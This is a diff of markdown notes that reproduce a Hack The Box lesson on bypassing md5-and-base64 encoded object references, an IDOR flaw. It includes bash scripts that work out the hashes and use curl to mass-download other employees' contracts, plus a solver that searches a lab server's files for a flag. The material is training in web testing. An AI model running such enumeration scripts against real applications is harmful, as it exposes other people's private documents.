@@ -1,25 +1,23 @@
 ﻿In the previous section, we saw an example of an IDOR that uses employee uids in clear text, making it easy to enumerate. In some cases, web applications make hashes or encode their object references, making enumeration more difficult, but it may still be possible.
 
-Let's go back to theÂ `Employee Manager`Â web application to test theÂ `Contracts`Â functionality:
+Let's go back to the`Employee Manager` web application to test the`Contracts` functionality:
 
-Â Â Â 
+ ![](https://academy.hackthebox.com/storage/modules/134/web_attacks_idor_contracts.jpg)
 
-![](https://academy.hackthebox.com/storage/modules/134/web_attacks_idor_contracts.jpg)
-
-If we click on theÂ `Employment_contract.pdf`Â file, it starts downloading the file. The intercepted request in Burp looks as follows:
+If we click on the`Employment_contract.pdf` file, it starts downloading the file. The intercepted request in Burp looks as follows:
 
 ![download_contract](https://academy.hackthebox.com/storage/modules/134/web_attacks_idor_download_contract.jpg)
 
-We see that it is sending aÂ `POST`Â request toÂ `download.php`Â with the following data:
+We see that it is sending a`POST` request to`download.php` with the following data:
 
 
 ```php
 contract=cdd96d3cc73d1dbdaffa03cc6cd7339b
 ```
 
-Using aÂ `download.php`Â script to download files is a common practice to avoid directly linking to files, as that may be exploitable with multiple web attacks. In this case, the web application is not sending the direct reference in cleartext but appears to be hashing it in anÂ `md5`Â format. Hashes are one-way functions, so we cannot decode them to see their original values.
+Using a`download.php` script to download files is a common practice to avoid directly linking to files, as that may be exploitable with multiple web attacks. In this case, the web application is not sending the direct reference in cleartext but appears to be hashing it in an`md5` format. Hashes are one-way functions, so we cannot decode them to see their original values.
 
-We can attempt to hash various values, likeÂ `uid`,Â `username`,Â `filename`, and many others, and see if any of theirÂ `md5`Â hashes match the above value. If we find a match, then we can replicate it for other users and collect their files. For example, let's try to compare theÂ `md5`Â hash of ourÂ `uid`, and see if it matches the above hash:
+We can attempt to hash various values, like`uid`,`username`,`filename`, and many others, and see if any of their`md5` hashes match the above value. If we find a match, then we can replicate it for other users and collect their files. For example, let's try to compare the`md5` hash of our`uid`, and see if it matches the above hash:
 
 
 ```shell-session
@@ -28,30 +26,30 @@ smoothment@htb[/htb]$ echo -n 1 | md5sum
 c4ca4238a0b923820dcc509a6f75849b -
 ```
 
-Unfortunately, the hashes do not match. We can attempt this with various other fields, but none of them matches our hash. In advanced cases, we may also utilizeÂ `Burp Comparer`Â and fuzz various values and then compare each to our hash to see if we find any matches. In this case, theÂ `md5`Â hash could be for a unique value or a combination of values, which would be very difficult to predict, making this direct reference aÂ `Secure Direct Object Reference`. However, there's one fatal flaw in this web application.
+Unfortunately, the hashes do not match. We can attempt this with various other fields, but none of them matches our hash. In advanced cases, we may also utilize`Burp Comparer` and fuzz various values and then compare each to our hash to see if we find any matches. In this case, the`md5` hash could be for a unique value or a combination of values, which would be very difficult to predict, making this direct reference a`Secure Direct Object Reference`. However, there's one fatal flaw in this web application.
 
 ---
 
 ## Function Disclosure
 
-As most modern web applications are developed using JavaScript frameworks, likeÂ `Angular`,Â `React`, orÂ `Vue.js`, many web developers may make the mistake of performing sensitive functions on the front-end, which would expose them to attackers. For example, if the above hash was being calculated on the front-end, we can study the function and then replicate what it's doing to calculate the same hash. Luckily for us, this is precisely the case in this web application.
+As most modern web applications are developed using JavaScript frameworks, like`Angular`,`React`, or`Vue.js`, many web developers may make the mistake of performing sensitive functions on the front-end, which would expose them to attackers. For example, if the above hash was being calculated on the front-end, we can study the function and then replicate what it's doing to calculate the same hash. Luckily for us, this is precisely the case in this web application.
 
-If we take a look at the link in the source code, we see that it is calling a JavaScript function withÂ `javascript:downloadContract('1')`. Looking at theÂ `downloadContract()`Â function in the source code, we see the following:
+If we take a look at the link in the source code, we see that it is calling a JavaScript function with`javascript:downloadContract('1')`. Looking at the`downloadContract()` function in the source code, we see the following:
 
 
 ```javascript
 function downloadContract(uid) {
-    $.redirect("/download.php", {
-        contract: CryptoJS.MD5(btoa(uid)).toString(),
-    }, "POST", "_self");
+ $.redirect("/download.php", {
+ contract: CryptoJS.MD5(btoa(uid)).toString(),
+ }, "POST", "_self");
 }
 ```
 
-This function appears to be sending aÂ `POST`Â request with theÂ `contract`Â parameter, which is what we saw above. The value it is sending is anÂ `md5`Â hash using theÂ `CryptoJS`Â library, which also matches the request we saw earlier. So, the only thing left to see is what value is being hashed.
+This function appears to be sending a`POST` request with the`contract` parameter, which is what we saw above. The value it is sending is an`md5` hash using the`CryptoJS` library, which also matches the request we saw earlier. So, the only thing left to see is what value is being hashed.
 
-In this case, the value being hashed isÂ `btoa(uid)`, which is theÂ `base64`Â encoded string of theÂ `uid`Â variable, which is an input argument for the function. Going back to the earlier link where the function was called, we see it callingÂ `downloadContract('1')`. So, the final value being used in theÂ `POST`Â request is theÂ `base64`Â encoded string ofÂ `1`, which was thenÂ `md5`Â hashed.
+In this case, the value being hashed is`btoa(uid)`, which is the`base64` encoded string of the`uid` variable, which is an input argument for the function. Going back to the earlier link where the function was called, we see it calling`downloadContract('1')`. So, the final value being used in the`POST` request is the`base64` encoded string of`1`, which was then`md5` hashed.
 
-We can test this byÂ `base64`Â encoding ourÂ `uid=1`, and then hashing it withÂ `md5`, as follows:
+We can test this by`base64` encoding our`uid=1`, and then hashing it with`md5`, as follows:
 
 ```shell-session
 smoothment@htb[/htb]$ echo -n 1 | base64 -w 0 | md5sum
@@ -59,19 +57,19 @@ smoothment@htb[/htb]$ echo -n 1 | base64 -w 0 | md5sum
 cdd96d3cc73d1dbdaffa03cc6cd7339b -
 ```
 
-**Tip:**Â We are using theÂ `-n`Â flag withÂ `echo`, and theÂ `-w 0`Â flag withÂ `base64`, to avoid adding newlines, in order to be able to calculate theÂ `md5`Â hash of the same value, without hashing newlines, as that would change the finalÂ `md5`Â hash.
+**Tip:** We are using the`-n` flag with`echo`, and the`-w 0` flag with`base64`, to avoid adding newlines, in order to be able to calculate the`md5` hash of the same value, without hashing newlines, as that would change the final`md5` hash.
 
-As we can see, this hash matches the hash in our request, meaning that we have successfully reversed the hashing technique used on the object references, turning them into IDOR's. With that, we can begin enumerating other employees' contracts using the same hashing method we used above.Â `Before continuing, try to write a script similar to what we used in the previous section to enumerate all contracts`.
+As we can see, this hash matches the hash in our request, meaning that we have successfully reversed the hashing technique used on the object references, turning them into IDOR's. With that, we can begin enumerating other employees' contracts using the same hashing method we used above.`Before continuing, try to write a script similar to what we used in the previous section to enumerate all contracts`.
 
 ---
 
 ## Mass Enumeration
 
-Once again, let us write a simple bash script to retrieve all employee contracts. More often than not, this is the easiest and most efficient method of enumerating data and files through IDOR vulnerabilities. In more advanced cases, we may utilize tools likeÂ `Burp Intruder`Â orÂ `ZAP Fuzzer`, but a simple bash script should be the best course for our exercise.
+Once again, let us write a simple bash script to retrieve all employee contracts. More often than not, this is the easiest and most efficient method of enumerating data and files through IDOR vulnerabilities. In more advanced cases, we may utilize tools like`Burp Intruder` or`ZAP Fuzzer`, but a simple bash script should be the best course for our exercise.
 
-We can start by calculating the hash for each of the first ten employees using the same previous command while usingÂ `tr -d`Â to remove the trailingÂ `-`Â characters, as follows:
+We can start by calculating the hash for each of the first ten employees using the same previous command while using`tr -d` to remove the trailing`-` characters, as follows:
 
-Â Â Bypassing Encoded References
+ Bypassing Encoded References
 
 ```shell-session
 smoothment@htb[/htb]$ for i in {1..10}; do echo -n $i | base64 -w 0 | md5sum | tr -d ' -'; done
@@ -88,17 +86,17 @@ d477819d240e7d3dd9499ed8d23e7158
 5d4aace023dc088767b4e08c79415dcd
 ```
 
-Next, we can make aÂ `POST`Â request onÂ `download.php`Â with each of the above hashes as theÂ `contract`Â value, which should give us our final script:
+Next, we can make a`POST` request on`download.php` with each of the above hashes as the`contract` value, which should give us our final script:
 
-Code:Â bash
+Code: bash
 
 ```bash
 #!/bin/bash
 
 for i in {1..10}; do
-    for hash in $(echo -n $i | base64 -w 0 | md5sum | tr -d ' -'); do
-        curl -sOJ -X POST -d "contract=$hash" http://SERVER_IP:PORT/download.php
-    done
+ for hash in $(echo -n $i | base64 -w 0 | md5sum | tr -d ' -'); do
+ curl -sOJ -X POST -d "contract=$hash" http://SERVER_IP:PORT/download.php
+ done
 done
 ```
 
@@ -170,34 +168,34 @@ url="http://94.237.59.190:52218/download.php?contract="
 flag_found=false
 
 cleanup() {
-    if ! $flag_found; then
-        rm -f contract_*.pdf 2>/dev/null
-    fi
+ if ! $flag_found; then
+ rm -f contract_*.pdf 2>/dev/null
+ fi
 }
 
 trap cleanup EXIT
 
 for i in {1..20}; do
-    for encodedid in $(echo -n $i | base64 -w 0); do
-        filename="contract_$i.pdf"
-        
-        # Download and save to file
-        curl -s -o "$filename" "${url}${encodedid}"
-        
-        # Check for flag pattern in PDF
-        if strings "$filename" | grep -aq "HTB{"; then
-            flag=$(strings "$filename" | grep -aoP "HTB{.*?}" | head -1)
-            echo -e "\033[1;32m[+] FLAG FOUND: $flag\033[0m"
-            flag_found=true
-            exit 0
-        else
-            rm -f "$filename"
-        fi
-    done
+ for encodedid in $(echo -n $i | base64 -w 0); do
+ filename="contract_$i.pdf"
+ 
+ # Download and save to file
+ curl -s -o "$filename" "${url}${encodedid}"
+ 
+ # Check for flag pattern in PDF
+ if strings "$filename" | grep -aq "HTB{"; then
+ flag=$(strings "$filename" | grep -aoP "HTB{.*?}" | head -1)
+ echo -e "\033[1;32m[+] FLAG FOUND: $flag\033[0m"
+ flag_found=true
+ exit 0
+ else
+ rm -f "$filename"
+ fi
+ done
 done
 
 if ! $flag_found; then
-    echo -e "\033[1;31m[-] No flag found in contracts 1-20\033[0m"
+ echo -e "\033[1;31m[-] No flag found in contracts 1-20\033[0m"
 fi
 ```
 
